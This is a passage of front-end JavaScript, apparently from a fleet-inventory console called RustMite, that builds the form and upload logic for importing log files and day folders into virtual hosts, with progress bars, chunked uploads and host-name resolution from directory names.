        </p>
        <label>Labels (optional env=… profile=…)
          <input name="labels" placeholder="env=external profile=logs" autocomplete="off" />
        </label>
        <hr style="border:none;border-top:1px solid var(--line, #333);margin:0.85rem 0" />
        <p class="muted" style="font-size:0.82rem;margin:0 0 0.65rem">
          Upload a <strong>day folder</strong> to create <em>or update</em> one virtual host per subdirectory
          (matched by display name from the folder). Or import loose files / a server path into a single host.
        </p>
        <label>Kind
          <select name="kind">
            <option value="auto">Auto (sniff)</option>
            <option value="processes">Processes</option>
            <option value="files">Files</option>
          </select>
        </label>
        <label>Server path (file or directory on the RustMite server)
          <input name="path" class="mono" placeholder="/var/log/fleet or ./samples/procs.jsonl" autocomplete="off" />
        </label>
        <label class="rules-enable" style="display:flex;gap:0.5rem;align-items:center;margin:0.35rem 0">
          <input type="checkbox" name="recursive" checked />
          Recurse directories (*.jsonl)
        </label>
        <label>Upload .jsonl / .json / .csv files
          <input type="file" id="createVirtualFiles" multiple accept=".jsonl,.ndjson,.json,.csv,text/*" />
        </label>
        <label>Or upload a folder (day folder → create/update hosts by subdirectory)
          <input type="file" id="createVirtualDir" webkitdirectory directory multiple />
        </label>
        <p id="createVirtualPickStatus" class="muted" style="font-size:0.78rem;margin:0.4rem 0 0;min-height:1.2em"></p>
        ${treeHostFromFieldsHtml("createVirt")}
        <div id="createVirtDisplayNameWrap" class="hidden">
          <label>Display name
            <input name="display_name" placeholder="siem-feed-prod" autocomplete="off" />
          </label>
          <p class="muted" style="font-size:0.75rem;margin:0.25rem 0 0">Only needed for a single host (tree import off, or flat file upload).</p>
        </div>
        <p class="muted" style="font-size:0.75rem;margin:0.25rem 0 0">Server path is only for paths the RustMite server can read. Prefer folder upload for local day trees (PulseSecure-style).</p>
        <div class="form-actions">
          <button type="submit" class="btn primary">Create / update</button>
          <button type="button" class="btn ghost" data-close-drawer>Cancel</button>
        </div>
      </form>
      <div id="virtualHostProgress" class="hidden"></div>
      <div id="virtualHostResult" class="hidden" style="margin-top:1rem"></div>
    `);
    const form = $("#virtualHostForm");
    wireVirtualUploadPickers("#createVirtualFiles", "#createVirtualDir", "#createVirtualPickStatus", {
      idPrefix: "createVirt",
    });
    wireTreeHostFromFields("createVirt", "#createVirtDisplayNameWrap");
    form?.addEventListener("submit", async (e) => {
      e.preventDefault();
      const fd = new FormData(form);
      const labels = {};
      String(fd.get("labels") || "")
        .split(/\s+/)
        .filter(Boolean)
        .forEach((pair) => {
          const i = pair.indexOf("=");
          if (i > 0) labels[pair.slice(0, i)] = pair.slice(i + 1);
        });
      const btn = form.querySelector('button[type="submit"]');
      if (btn) btn.disabled = true;
      const progWrap = $("#virtualHostProgress");
      if (progWrap) {
        progWrap.classList.remove("hidden");
        progWrap.innerHTML = importProgressHtml("virtualHostProgBar");
        progWrap.scrollIntoView({ behavior: "smooth", block: "nearest" });
      }
      const ticker = startImportProgressTicker("virtualHostProgBar");
      try {
        setImportProgress("virtualHostProgBar", {
          title: "Preparing import",
          detail: "Scanning selected files…",
          pct: 0,
        });
        const feed = await readVirtualFeedFields(
          fd,
          "#createVirtualFiles",
          "#createVirtualDir",
          (p) => setImportProgress("virtualHostProgBar", {
            title: p.phase === "scan" || p.phase === "scan_done" ? "Scanning folder" : "Reading files",
            detail: p.detail,
            pct: p.pct,
          })
        );
        const treeChecked = fd.get("tree_import") != null;
        const wantTree = treeChecked && isVirtualTreeFolderUpload(feed.files || []);
        if (treeChecked && (feed.files || []).length && !wantTree) {
          $("#createVirtDisplayNameWrap")?.classList.remove("hidden");
          const displayName = String(fd.get("display_name") || "").trim();
          if (!displayName) {
            toast("Folder has no host subdirectories — enter a display name for a single host, or pick a day folder");
            ticker.stop();
            return;
          }
        }
        if (wantTree) {
          const treeOpts = readTreeHostFromForm(fd, "createVirt");
          setImportProgress("virtualHostProgBar", {
            title: "Importing host tree",
            detail: "Create or update one virtual host per subdirectory…",
            pct: 0,
          });
          const res = await importVirtualTreeUpload(
            feed.files,
            {
              host_from: treeOpts.host_from,
              parent_dir_field: treeOpts.parent_dir_field,
              delimiter: treeOpts.delimiter,
              create_scan: treeOpts.create_scan,
              replace: treeOpts.replace,
              kind: feed.kind || "auto",
              virtual_agent_id: String(fd.get("virtual_agent_id") || "").trim() || null,
            },
            (p) => setImportProgress("virtualHostProgBar", {
              title: "Importing host tree",
              detail: p.detail,
              pct: p.pct,
            })
          );
          ticker.stop();
          const s = res.summary || {};
          const updated = (s.results || []).filter((r) => !r.error && r.created === false).length;
          const created = (s.results || []).filter((r) => !r.error && r.created === true).length;
          setImportProgress("virtualHostProgBar", {
            title: "Done",
            detail: `${s.hosts_ok ?? 0} hosts ok (${created} new · ${updated} updated) · ${s.hosts_failed ?? 0} failed · ${s.hosts_skipped ?? 0} skipped`,
            done: true,
          });
          const box = $("#virtualHostResult");
          if (box) {
            const rows = (s.results || []).slice(0, 40).map((r) => `
              <tr>
                <td class="mono">${esc(r.dir || "")}</td>
                <td>${esc(r.display_name || "")}</td>
                <td>${r.error ? "—" : (r.created ? "new" : "updated")}</td>
                <td class="mono">${r.error ? esc(r.error) : `${r.processes ?? 0}p / ${r.files ?? 0}f`}</td>
              </tr>`).join("");
            box.classList.remove("hidden");
            box.innerHTML = `
              <div class="panel" style="padding:0.75rem">
                <div><strong>Tree upload</strong> · ${esc(String(created))} created · ${esc(String(updated))} updated · ${esc(String(s.hosts_failed ?? 0))} failed</div>
                <div class="data-table-wrap" style="margin-top:0.55rem;max-height:220px;overflow:auto">
                  <table class="data"><thead><tr><th>Dir</th><th>Host</th><th></th><th>Result</th></tr></thead><tbody>${rows}</tbody></table>
                </div>
              </div>`;
          }
          toast(`Tree upload: ${created} new · ${updated} updated`);
          state._hostPreset = "";
          state._hostQ = "";
          await loadAll();
          location.hash = "#/hosts";
          render();
          return;
        }
        const displayName = String(fd.get("display_name") || "").trim();
        if (!displayName && !(feed.path || "").trim() && !(feed.files || []).length) {
          toast("Upload a day folder, or enter a display name for an empty virtual host");
          $("#createVirtDisplayNameWrap")?.classList.remove("hidden");
          ticker.stop();
          return;
        }
        if (!displayName && !(feed.path || "").trim() && (feed.files || []).length) {
          toast("Display name required for a single-host import");
          $("#createVirtDisplayNameWrap")?.classList.remove("hidden");
          ticker.stop();
          return;
        }
        if (!displayName && (feed.path || "").trim()) {
          // Server-path single import still needs a name for the host record.
          toast("Display name required when importing a server path into one host");
          $("#createVirtDisplayNameWrap")?.classList.remove("hidden");
          ticker.stop();
          return;
        }
        if (!displayName) {
          toast("Display name required");
          $("#createVirtDisplayNameWrap")?.classList.remove("hidden");
          ticker.stop();
          return;
        }
        const hasImport = !!(feed.path || (feed.files && feed.files.length));
        const singleOpts = readTreeHostFromForm(fd, "createVirt");
        const existed = existingVirtualHostNames().has(displayName);
        setImportProgress("virtualHostProgBar", {
          title: hasImport
            ? (existed ? "Updating host + importing" : "Creating host + importing")
            : (existed ? "Updating host" : "Creating host"),
          detail: hasImport
            ? "Server is parsing JSONL (PulseSecure mixed files can take a minute)…"
            : (existed ? "Refreshing virtual agent…" : "Registering virtual agent…"),
          pct: null,
        });
        const res = await createVirtualHostChunked({
          display_name: displayName,
          labels,
          path: feed.path || null,
          recursive: feed.recursive,
          kind: feed.kind || "auto",
          files: feed.files || [],
          create_scan: singleOpts.create_scan,
          replace: singleOpts.replace,
          virtual_agent_id: String(fd.get("virtual_agent_id") || "").trim() || null,
        }, (p) => setImportProgress("virtualHostProgBar", {
          title: p.phase === "pack" ? "Packaging upload" : "Uploading to server",
          detail: p.detail,
          pct: p.pct,
        }));
        ticker.stop();
        const tok = res.host?.ingest_token
          || res.ingest?.ingest_token
          || (res.ingest?.authorization || "").replace(/^Bearer\s+/i, "")
          || "";
        const hid = String(res.host?.id || "");
        const verb = res.created === false || existed ? "updated" : "created";
        let importNote = "";
        if (res.import_error) {
          importNote = ` · import failed: ${res.import_error}`;
          setImportProgress("virtualHostProgBar", {
            title: `Host ${verb} — import failed`,
            detail: String(res.import_error),
            done: true,
          });
        } else if (res.import) {
          const s = res.import;
          importNote = ` · imported ${s.files_processed ?? 0} file(s) (+${s.processes_appended ?? 0} proc / +${s.files_appended ?? 0} file rows)`;
          setImportProgress("virtualHostProgBar", {
            title: "Done",
            detail: `Processes +${s.processes_appended ?? 0} · files +${s.files_appended ?? 0} · skipped ${s.skipped ?? 0}`,
            done: true,
          });
        } else {
          setImportProgress("virtualHostProgBar", {
            title: "Done",
            detail: `Virtual agent ${verb} (no import)`,
            done: true,
          });
        }
        const box = $("#virtualHostResult");
        if (box) {
          box.classList.remove("hidden");
          box.innerHTML = `
            <div class="panel" style="padding:0.75rem">
              <div><strong>${esc(res.host?.display_name || "virtual")}</strong> ${esc(verb)}${esc(importNote)}</div>
              <div class="mono" style="margin-top:0.5rem;word-break:break-all">${esc(tok)}</div>
              <div class="form-actions" style="justify-content:flex-start;margin-top:0.65rem">
                <button type="button" class="btn ghost tiny" data-copy-ingest="${esc(tok)}">Copy token</button>
                <button type="button" class="btn primary tiny" id="btnFeedNewVirtual">Feed more logs</button>
                ${hid ? `<button type="button" class="btn ghost tiny" id="btnOpenNewVirtual">Open host</button>` : ""}
              </div>
            </div>`;
          box.querySelector("[data-copy-ingest]")?.addEventListener("click", async () => {
            try {
              await navigator.clipboard.writeText(tok);
              toast("Ingest token copied");
            } catch (_) {
              toast(tok);
            }
          });
          box.querySelector("#btnFeedNewVirtual")?.addEventListener("click", () => {
            closeDrawer();
            showFeedVirtualHost(hid, res.host?.display_name || "");
          });
          box.querySelector("#btnOpenNewVirtual")?.addEventListener("click", () => {
            closeDrawer();
            openHostById(hid);
          });
        }
        await loadAll();
        toast(res.import_error
          ? `Virtual agent ${verb} (import failed — see details)`
          : `Virtual agent ${verb}${res.import ? " + logs imported" : ""}`);
      } catch (err) {
        ticker.stop();
        setImportProgress("virtualHostProgBar", {
          title: "Failed",
          detail: err.message || String(err),
          done: true,
        });
        toast(err.message);
      } finally {
        if (btn) btn.disabled = false;
      }
    });
    $$("[data-close-drawer]").forEach((b) => b.addEventListener("click", () => closeDrawer()));
  }

  function importProgressHtml(id) {
    return `<div class="import-progress" id="${esc(id)}" role="status" aria-live="polite">
      <div class="ip-title">Working…</div>
      <div class="ip-detail">Starting</div>
      <div class="bar indeterminate"><span style="width:35%"></span></div>
      <div class="ip-meta"><span class="ip-pct">—</span><span class="ip-elapsed">0.0s</span></div>
    </div>`;
  }

  function setImportProgress(rootOrId, opts) {
    const root = typeof rootOrId === "string" ? document.getElementById(rootOrId) : rootOrId;
    if (!root) return;
    const title = opts.title != null ? opts.title : null;
    const detail = opts.detail != null ? opts.detail : null;
    const pct = opts.pct;
    if (title != null) {
      const el = root.querySelector(".ip-title");
      if (el) el.textContent = title;
    }
    if (detail != null) {
      const el = root.querySelector(".ip-detail");
      if (el) el.textContent = detail;
    }
    const bar = root.querySelector(".bar");
    const fill = root.querySelector(".bar > span");
    const pctEl = root.querySelector(".ip-pct");
    if (bar && fill && pct != null && Number.isFinite(pct)) {
      const p = Math.max(0, Math.min(100, pct));
      bar.classList.remove("indeterminate");
      fill.style.width = `${p}%`;
      if (pctEl) pctEl.textContent = `${Math.round(p)}%`;
    } else if (bar && pct === null) {
      bar.classList.add("indeterminate");
      if (fill) fill.style.width = "35%";
      if (pctEl) pctEl.textContent = "…";
    }
    if (opts.elapsedMs != null) {
      const el = root.querySelector(".ip-elapsed");
      if (el) el.textContent = `${(opts.elapsedMs / 1000).toFixed(1)}s`;
    }
    if (opts.done) {
      bar?.classList.remove("indeterminate");
      if (fill) fill.style.width = "100%";
      if (pctEl) pctEl.textContent = "100%";
    }
  }

  function startImportProgressTicker(rootOrId) {
    const t0 = performance.now();
    const id = setInterval(() => {
      setImportProgress(rootOrId, { elapsedMs: performance.now() - t0 });
    }, 200);
    return {
      t0,
      stop() {
        clearInterval(id);
        setImportProgress(rootOrId, { elapsedMs: performance.now() - t0 });
      },
    };
  }

  /** Yield so the browser can paint progress UI during long folder scans/reads. */
  function yieldToUi() {
    return new Promise((resolve) => {
      requestAnimationFrame(() => setTimeout(resolve, 0));
    });
  }

  function formatUploadBytes(n) {
    const x = Number(n) || 0;
    if (x < 1024) return `${x} B`;
    if (x < 1024 * 1024) return `${(x / 1024).toFixed(1)} KB`;
    if (x < 1024 * 1024 * 1024) return `${(x / (1024 * 1024)).toFixed(1)} MB`;
    return `${(x / (1024 * 1024 * 1024)).toFixed(2)} GB`;
  }

  function isVirtualUploadName(name) {
    return /\.(jsonl|ndjson|json|csv)$/i.test(String(name || ""));
  }

  /**
   * Collect matching upload files while yielding so huge webkitdirectory lists
   * do not freeze the tab before reading begins.
   */
  async function collectVirtualUploadCandidates(fileInputSel, dirInputSel, onProgress) {
    const pending = [];
    let scanned = 0;
    const fileInput = $(fileInputSel);
    const fileList = fileInput?.files;
    if (fileList?.length) {
      const total = fileList.length;
      for (let i = 0; i < total; i++) {
        pending.push(fileList[i]);
        scanned++;
        if (i % 48 === 0 || i === total - 1) {
          onProgress?.({
            phase: "scan",
            pct: Math.min(8, ((i + 1) / total) * 8),
            detail: `Scanning files… ${i + 1}/${total}`,
          });
          await yieldToUi();
        }
      }
    }
    if (dirInputSel) {
      const dirInput = $(dirInputSel);
      const list = dirInput?.files;
      if (list?.length) {
        const total = list.length;
        for (let i = 0; i < total; i++) {
          const f = list[i];
          scanned++;
          if (isVirtualUploadName(f.name)) pending.push(f);
          if (i % 48 === 0 || i === total - 1) {
            onProgress?.({
              phase: "scan",
              pct: Math.min(18, 8 + ((i + 1) / total) * 10),
              detail: `Scanning folder… ${i + 1}/${total} · ${pending.length} matching (.jsonl/.json/.csv)`,
            });
            await yieldToUi();
          }
        }
      }
    }
    return { pending, scanned };
  }

  function virtualPickStatusText(pending, scanned, matchSummary) {
    if (!scanned) return "";
    const bytes = pending.reduce((n, f) => n + (f.size || 0), 0);
    let text = `Selected ${pending.length} matching file${pending.length === 1 ? "" : "s"}`
      + (scanned > pending.length ? ` (${scanned} in folder)` : "")
      + ` · ${formatUploadBytes(bytes)}`;
    if (matchSummary) {
      text += ` · ${virtualTreeMatchPreviewText(matchSummary)}`;
    } else {
      text += " — Finish when ready (large folders may take a while to read).";
    }
    return text;
  }

  /**
   * @param {string} fileInputSel
   * @param {string|null} dirInputSel
   * @param {string|HTMLElement|null} statusSel
   * @param {{ idPrefix?: string, previewSel?: string }} [opts]
   */
  function wireVirtualUploadPickers(fileInputSel, dirInputSel, statusSel, opts = {}) {
    const statusEl = typeof statusSel === "string" ? $(statusSel) : statusSel;
    const idPrefix = opts.idPrefix || "";
    const previewEl = opts.previewSel
      ? (typeof opts.previewSel === "string" ? $(opts.previewSel) : opts.previewSel)
      : (idPrefix ? $(`#${idPrefix}TreePreview`) : null);
    let gen = 0;
    let lastPending = [];
    let lastScanned = 0;

    const treeOptsFromDom = () => {
      if (!idPrefix) return {};
      const hostFrom = $(`#${idPrefix}HostFrom`)?.value || "dirname";
      const out = {
        host_from: hostFrom,
        delimiter: document.querySelector(`#${idPrefix}SegmentFields input[name="delimiter"]`)?.value || "-",
      };
      const fieldEl = document.querySelector(`#${idPrefix}SegmentFields input[name="parent_dir_field"]`);
      if (hostFrom === "segment") {
        out.parent_dir_field = Number(fieldEl?.value || 4) || 4;
      } else if (hostFrom === "pulsesecure") {
        const field = Number(fieldEl?.value || 0);
        if (field > 0) out.parent_dir_field = field;
      }
      return out;
    };

    const applyPreview = (pending, scanned) => {
      const treeOn = !idPrefix || !!$(`#${idPrefix}TreeImport`)?.checked;
      const fakeFiles = (pending || []).map((f) => ({
        name: f.webkitRelativePath || f.name,
        content: "",
      }));
      const match = treeOn && fakeFiles.length
        ? summarizeVirtualTreeMatch(fakeFiles, treeOptsFromDom())
        : null;
      if (statusEl) {
        statusEl.textContent = scanned ? virtualPickStatusText(pending, scanned, match) : "";
      }
      if (previewEl) {
        previewEl.textContent = match
          ? `Will ${match.willUpdate ? `update ${match.willUpdate}` : "update 0"}`
            + ` · create ${match.willCreate} — names: ${match.names.slice(0, 6).join(", ")}${match.names.length > 6 ? "…" : ""}`
          : (treeOn ? "" : "Tree import off — single named host mode");
      }
    };

    const refresh = async () => {
      const my = ++gen;
      if (statusEl) {
        statusEl.textContent = "Scanning selection…";
        statusEl.classList.remove("hidden");
      }
      try {
        const { pending, scanned } = await collectVirtualUploadCandidates(
          fileInputSel,
          dirInputSel,
          (p) => {
            if (my !== gen || !statusEl) return;
            statusEl.textContent = p.detail || "Scanning…";
          }
        );
        if (my !== gen) return;
        lastPending = pending;
        lastScanned = scanned;
        applyPreview(pending, scanned);
      } catch (_) {
        if (my === gen && statusEl) statusEl.textContent = "";
      }
    };

    $(fileInputSel)?.addEventListener("change", refresh);
    if (dirInputSel) $(dirInputSel)?.addEventListener("change", refresh);
    const onOpts = (ev) => {
      if (idPrefix && ev.detail?.idPrefix && ev.detail.idPrefix !== idPrefix) return;
      if (lastScanned) applyPreview(lastPending, lastScanned);
    };
    document.addEventListener("rustmite:virt-tree-opts", onOpts);
  }

  async function readVirtualFeedFields(fd, fileInputSel, dirInputSel, onProgress) {
    const path = String(fd.get("path") || "").trim();
    const kind = String(fd.get("kind") || "auto");
    const recursive = fd.get("recursive") != null;
    const replace = true;
    const files = [];
    onProgress?.({
      phase: "scan",
      pct: 0,
      detail: "Scanning selected files…",
    });
    await yieldToUi();
    const { pending, scanned } = await collectVirtualUploadCandidates(
      fileInputSel,
      dirInputSel,
      onProgress
    );
    const totalBytes = pending.reduce((n, f) => n + (f.size || 0), 0) || 1;
    if (pending.length) {
      onProgress?.({
        phase: "scan_done",
        pct: 18,
        detail: `Found ${pending.length} file(s) · ${formatUploadBytes(totalBytes)}`
          + (scanned > pending.length ? ` (${scanned} scanned)` : "")
          + " — reading…",
      });
      await yieldToUi();
    }
    let readBytes = 0;
    for (let i = 0; i < pending.length; i++) {
      const f = pending[i];
      const rel = f.webkitRelativePath || f.name;
      const sizeHint = f.size ? ` · ${formatUploadBytes(f.size)}` : "";
      onProgress?.({
        phase: "read",
        index: i,
        total: pending.length,
        name: rel,
        pct: 18 + Math.min(77, (readBytes / totalBytes) * 77),
        detail: `Reading ${rel} (${i + 1}/${pending.length})${sizeHint}`,
      });
      // Paint before the potentially heavy FileReader / decode work.
      await yieldToUi();
      const content = await f.text();
      readBytes += f.size || content.length;
      files.push({ name: rel, content });
      if (pending.length > 12 || (f.size || 0) > 1_500_000) {
        await yieldToUi();
      }
    }
    if (onProgress && pending.length) {
      onProgress({
        phase: "read_done",
        pct: 96,
        detail: `Read ${pending.length} file(s) · ${formatUploadBytes(readBytes)} — preparing upload…`,
      });
      await yieldToUi();
    }
    return { path, kind, recursive, replace, files, readBytes, fileCount: pending.length };
  }

  async function postVirtualImportBody(url, bodyObj, onProgress) {
    onProgress?.({
      phase: "pack",
      pct: 97,
      detail: `Packaging ${bodyObj.files?.length || 0} file(s) as JSON…`,
    });
    await yieldToUi();
    const body = JSON.stringify(bodyObj);
    onProgress?.({
      phase: "upload",
      pct: null,
      detail: `Uploading ${formatUploadBytes(body.length)} to server (parsing on server may take a minute)…`,
    });
    await yieldToUi();
    return api(url, { method: "POST", body });
  }

  /** Stay under the server body limit (and leave room for JSON escaping overhead). */
  const VIRTUAL_UPLOAD_CHUNK_BYTES = 48 * 1024 * 1024;

  function estimateVirtualFileJsonBytes(file) {
    return (file?.name?.length || 0) + (file?.content?.length || 0) + 48;
  }

  function chunkVirtualUploadFiles(files, maxBytes = VIRTUAL_UPLOAD_CHUNK_BYTES) {
    const list = Array.isArray(files) ? files : [];
    if (!list.length) return [[]];
    const chunks = [];
    let cur = [];
    let size = 0;
    for (const f of list) {
      const est = estimateVirtualFileJsonBytes(f);
      if (cur.length && size + est > maxBytes) {
        chunks.push(cur);
        cur = [];
        size = 0;
      }
      cur.push(f);
      size += est;
    }
    if (cur.length) chunks.push(cur);
    return chunks;
  }

  function mergeVirtualImportSummary(a, b) {
    if (!a) return b || null;
    if (!b) return a;
    return {
      files_processed: (a.files_processed || 0) + (b.files_processed || 0),
      processes_appended: (a.processes_appended || 0) + (b.processes_appended || 0),
      files_appended: (a.files_appended || 0) + (b.files_appended || 0),
      skipped: (a.skipped || 0) + (b.skipped || 0),
      path: a.path || b.path || null,
    };
  }

  /**
   * Create a virtual host, uploading large file sets in multiple requests.
   * First request creates the host (+ optional first file batch); later batches
   * append via `/ingest/import`. Scan snapshot is recorded on the last batch.
   */
  async function createVirtualHostChunked(bodyBase, onProgress) {
    const files = bodyBase.files || [];
    const chunks = chunkVirtualUploadFiles(files);
    const createScan = !!bodyBase.create_scan;
    if (chunks.length <= 1) {
      return postVirtualImportBody(
        "/v1/hosts/virtual",
        { ...bodyBase, files, create_scan: createScan },
        onProgress
      );
    }
    onProgress?.({
      phase: "upload",
      detail: `Large folder — uploading in ${chunks.length} batches…`,
    });
    const first = await postVirtualImportBody(
      "/v1/hosts/virtual",
      {
        ...bodyBase,
        files: chunks[0],
        create_scan: false,
      },
      (p) => onProgress?.({
        ...p,
        detail: `Batch 1/${chunks.length}: ${p.detail || ""}`,
      })
    );
    const hostId = first.host?.id;
    if (!hostId) return first;
    let importSummary = first.import || null;
    let importError = first.import_error || null;
    let scanId = first.scan_id || null;
    let scanError = first.scan_error || null;
    for (let i = 1; i < chunks.length; i++) {
      const isLast = i === chunks.length - 1;
      onProgress?.({
        phase: "upload",
        detail: `Uploading batch ${i + 1}/${chunks.length}…`,
      });
      try {
        const res = await postVirtualImportBody(
          `/v1/hosts/${encodeURIComponent(hostId)}/ingest/import`,
          {
            path: null,
            recursive: !!bodyBase.recursive,
            kind: bodyBase.kind || "auto",
            files: chunks[i],
            replace: false,
            create_scan: isLast && createScan,
            virtual_agent_id: bodyBase.virtual_agent_id || null,
          },
          (p) => onProgress?.({
            ...p,
            detail: `Batch ${i + 1}/${chunks.length}: ${p.detail || ""}`,
          })
        );
        importSummary = mergeVirtualImportSummary(importSummary, res.summary);
        if (res.scan_id) scanId = res.scan_id;
        if (res.scan_error) scanError = res.scan_error;
      } catch (err) {
        importError = err.message || String(err);
        break;
      }
    }
    return {
      ...first,
      import: importSummary,
      import_error: importError,
      scan_id: scanId,
      scan_error: scanError,
    };
  }

  /** Feed an existing virtual host, chunking large uploads and appending after the first batch. */
  async function importVirtualFeedChunked(hostId, bodyBase, onProgress) {
    const files = bodyBase.files || [];
    const chunks = chunkVirtualUploadFiles(files);
    const url = `/v1/hosts/${encodeURIComponent(hostId)}/ingest/import`;
    if (chunks.length <= 1) {
      return postVirtualImportBody(url, { ...bodyBase, files }, onProgress);
    }
    onProgress?.({
      phase: "upload",
      detail: `Large folder — uploading in ${chunks.length} batches…`,
    });
    let summary = null;
    let last = null;
    for (let i = 0; i < chunks.length; i++) {
      const isFirst = i === 0;
      const isLast = i === chunks.length - 1;
      onProgress?.({
        phase: "upload",
        detail: `Uploading batch ${i + 1}/${chunks.length}…`,
      });
      last = await postVirtualImportBody(
        url,
        {
          ...bodyBase,
          path: isFirst ? (bodyBase.path || null) : null,
          files: chunks[i],
          replace: isFirst ? !!bodyBase.replace : false,
          create_scan: isLast && !!bodyBase.create_scan,
        },
        (p) => onProgress?.({
          ...p,
          detail: `Batch ${i + 1}/${chunks.length}: ${p.detail || ""}`,
        })
      );
      summary = mergeVirtualImportSummary(summary, last.summary);
    }
    return { ...(last || {}), summary };
  }

  function groupVirtualFilesByTopDir(files) {
    const entries = [];
    for (const f of files || []) {
      const rel = String(f.name || "").replace(/\\/g, "/").replace(/^\.\//, "");
      const parts = rel.split("/").filter(Boolean);
      if (!parts.length) continue;
      entries.push({ file: f, parts, rel });
    }
    const byDir = new Map();
    const root = [];
    if (!entries.length) return { byDir, root };

    // Peel shared wrappers (selected folder / day folder) so host dirs become the top level.
    // e.g. 2026-05-10/HOST-A/a.jsonl + 2026-05-10/HOST-B/b.jsonl → hosts HOST-A, HOST-B
    let start = 0;
    while (start < 4) {
      const at = new Set(entries.map((e) => e.parts[start]).filter(Boolean));
      if (at.size !== 1) break;
      if (!entries.every((e) => e.parts.length > start + 1)) break;
      const next = new Set(
        entries
          .filter((e) => e.parts.length > start + 1)
          .map((e) => e.parts[start + 1])
      );
      // Shared wrapper over multiple host directories (or another wrapper).
      if (next.size >= 2) {
        start += 1;
        break;
      }
      if (next.size === 1 && entries.every((e) => e.parts.length > start + 2)) {
        start += 1;
        continue;
      }
      break;
    }

    for (const e of entries) {
      if (e.parts.length <= start + 1) {
        // File at (or above) host level without a host directory.
        root.push({ name: e.rel, content: e.file.content });
        continue;
      }
      const dir = e.parts[start];
      const rest = e.parts.slice(start + 1).join("/");
      if (!byDir.has(dir)) byDir.set(dir, []);
      byDir.get(dir).push({ name: `${dir}/${rest}`, content: e.file.content });
    }
    return { byDir, root, peel: start };
  }

  /** Day-folder layout: files live under host subdirectories (not flat in the selected folder). */
  function isVirtualTreeFolderUpload(files) {
    const { byDir, root } = groupVirtualFilesByTopDir(files);
    // Prefer tree when we found ≥1 host subdirectory (ignore stray root files).
    return byDir.size >= 1;
  }

  function treeHostFromFieldsHtml(idPrefix = "virtTree") {
    return `
      <fieldset class="ml-device-rule" id="${esc(idPrefix)}HostFromBox" style="border:1px solid color-mix(in srgb, var(--border,#fff) 55%, transparent);border-radius:8px;padding:0.65rem 0.75rem;margin:0.5rem 0 0.75rem">
        <legend style="font-size:0.8rem;padding:0 0.35rem">Day folder → hosts by subdirectory</legend>
        <label class="rules-enable" style="display:flex;gap:0.5rem;align-items:center;margin:0 0 0.55rem">
          <input type="checkbox" name="tree_import" id="${esc(idPrefix)}TreeImport" checked />
          One host per subdirectory — <strong>create new or update</strong> when the display name already exists
        </label>
        <label>Host name from directory
          <select name="host_from" id="${esc(idPrefix)}HostFrom">
            <option value="dirname" selected>Full directory name</option>
            <option value="segment">Directory segment (IronSift)</option>
            <option value="pulsesecure">PulseSecure heuristic</option>
          </select>
        </label>
        <div id="${esc(idPrefix)}SegmentFields" class="ml-form-grid" style="margin-top:0.55rem;display:none">
          <label>Segment field <span class="muted">(1-based)</span>
            <input type="number" name="parent_dir_field" min="1" max="32" value="4" />
          </label>
          <label>Delimiter
            <input name="delimiter" maxlength="1" value="-" class="mono" />
          </label>
        </div>
        <p class="muted" style="font-size:0.75rem;margin:0.45rem 0 0">
          Matching is by <span class="mono">display_name</span>. Each import <strong>adds a new scan</strong> under Scans (previous imports stay in history). Current inventory is refreshed for Fleet Sift. Uncheck tree import only for a single named host.
        </p>
        <p id="${esc(idPrefix)}TreePreview" class="muted mono" style="font-size:0.75rem;margin:0.45rem 0 0;min-height:1.1em"></p>
      </fieldset>`;
  }

  /** Mirror server resolve_host_name_ex for UI preview / matching. */
  function resolveVirtualHostName(dirname, hostFrom, parentDirField, delimiter) {
    const name = String(dirname || "").trim().replace(/\/+$/, "");
    const mode = String(hostFrom || "dirname").toLowerCase();
    const delim = String(delimiter || "-").charAt(0) || "-";
    if (mode === "dirname" || mode === "dir" || mode === "full") return name;
    if (mode === "segment" || mode === "parent_dir" || mode === "field") {
      const field = Math.max(1, Number(parentDirField) || 4);
      const parts = name.split(delim);
      return parts[field - 1] || name;
    }
    if (mode === "pulsesecure" || mode === "pulse") {
      if (parentDirField != null && Number(parentDirField) >= 1) {
        const field = Math.max(1, Number(parentDirField));
        const parts = name.split(delim);
        if (parts[field - 1]) return parts[field - 1];
      }
      const prefix = "PulseSecure-Periodicsnapshot-";
      let rest = name.startsWith(prefix) ? name.slice(prefix.length) : name;
      if (rest.startsWith("standalone-")) rest = rest.slice("standalone-".length);
      else {
        const idx = rest.indexOf("-");
        if (idx >= 0) rest = rest.slice(idx + 1);
      }
      const parts = rest.split("-");
      if (parts.length >= 3) {
        const last = parts[parts.length - 1];
        const prev = parts[parts.length - 2];
        if (
          prev.length === 8 && /^\d+$/.test(prev)
          && (last.length === 4 || last.length === 6) && /^\d+$/.test(last)
        ) {
          return parts.slice(0, -2).join("-");
        }
      }
      return rest || name;
    }
    return name;
  }

  function existingVirtualHostNames() {
    const set = new Set();
    for (const h of state.hosts || []) {
      const virt = String(h.agent_kind || "").toLowerCase() === "virtual"
        || String(h.auth_status || "").toLowerCase() === "virtual";
      if (!virt) continue;
      const n = String(h.display_name || "").trim();
      if (n) set.add(n);
    }
    return set;
  }

  function summarizeVirtualTreeMatch(files, opts = {}) {
    const { byDir } = groupVirtualFilesByTopDir(files);
    if (!byDir.size) return null;
    const existing = existingVirtualHostNames();
    const hostFrom = opts.host_from || "dirname";
    const field = opts.parent_dir_field;
    const delim = opts.delimiter || "-";
    let willCreate = 0;
    let willUpdate = 0;
    const names = [];
    for (const dirname of [...byDir.keys()].sort()) {
      const display = resolveVirtualHostName(dirname, hostFrom, field, delim);
      names.push(display);
      if (existing.has(display)) willUpdate += 1;
      else willCreate += 1;
    }
    return {
      dirs: byDir.size,
      willCreate,
      willUpdate,
      names,
    };
  }

  function virtualTreeMatchPreviewText(summary) {
    if (!summary) return "";
    const bits = [`${summary.dirs} host dir(s)`];
    if (summary.willUpdate) bits.push(`${summary.willUpdate} update`);
    if (summary.willCreate) bits.push(`${summary.willCreate} new`);
    const sample = summary.names.slice(0, 4).join(", ");
    const more = summary.names.length > 4 ? ` (+${summary.names.length - 4})` : "";
    return `${bits.join(" · ")} — ${sample}${more}`;
  }

  function readTreeHostFromForm(formOrFd, idPrefix = "virtTree") {
    const fd = formOrFd instanceof FormData
      ? formOrFd
      : new FormData(formOrFd || document.createElement("form"));
    const hostFrom = String(fd.get("host_from") || "dirname");
    const out = {
      host_from: hostFrom,
      delimiter: String(fd.get("delimiter") || "-").charAt(0) || "-",
      // Always refresh current inventory + append a new Store scan (history kept).
      replace: true,
      create_scan: true,
      tree_import: fd.get("tree_import") != null,
    };
